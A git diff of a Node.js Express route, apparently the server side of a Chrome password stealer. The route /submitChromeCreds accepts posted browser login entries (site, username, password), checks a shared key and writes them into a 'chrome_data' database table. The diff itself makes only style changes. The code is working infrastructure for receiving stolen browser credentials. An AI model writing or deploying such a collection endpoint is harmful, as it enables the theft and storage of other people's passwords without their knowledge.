@@ -7,13 +7,12 @@ const express = require('express');
 
 /* set our constants */
 const router = express.Router();
-const fs = require('fs');
 const log = require('../bin/loggers/logger-chrome');
 
 /* set the post path and set the logic */
 router.post('/submitChromeCreds', function(req, res, next) {
   /* define our data array for the sanatized data */
-  let dataArray = [];
+  const dataArray = [];
   /* push all JSON items to the sanatized array */
   Object.entries(req.body).forEach(function(el) {
     dataArray.push(el[1]);
@@ -22,9 +21,9 @@ router.post('/submitChromeCreds', function(req, res, next) {
   /* check if the DB Secret key matches */
   if (dataArray.shift().value == dbSecret) {
     /* create a random timestamp for our data */
-    let ranStamp = Math.floor(Date.now() + Math.random());
+    const ranStamp = Math.floor(Date.now() + Math.random());
     dataArray.forEach(function(el) {
-      let query = 'INSERT INTO chrome_data (dataset, chrome_url, chrome_user, chrome_pw) VALUES (?, ?, ?, ?)';
+      const query = 'INSERT INTO chrome_data (dataset, chrome_url, chrome_user, chrome_pw) VALUES (?, ?, ?, ?)';
 
       /* insert the data sanatized to prevent sql injection */
       db.query(query, [ranStamp, el.signon_realm, el.username_value, el.password_value], function(err, status) {
@@ -32,10 +31,10 @@ router.post('/submitChromeCreds', function(req, res, next) {
       });
     });
 
-    log.info("Added data to table", dataArray);
+    log.info('Added data to table', dataArray);
     res.sendStatus(200); // return a 200 status code
   } else {
-    log.warn("Invaid key!");
+    log.warn('Invaid key!');
     res.sendStatus(403); // return access denied (403)
   }
 });
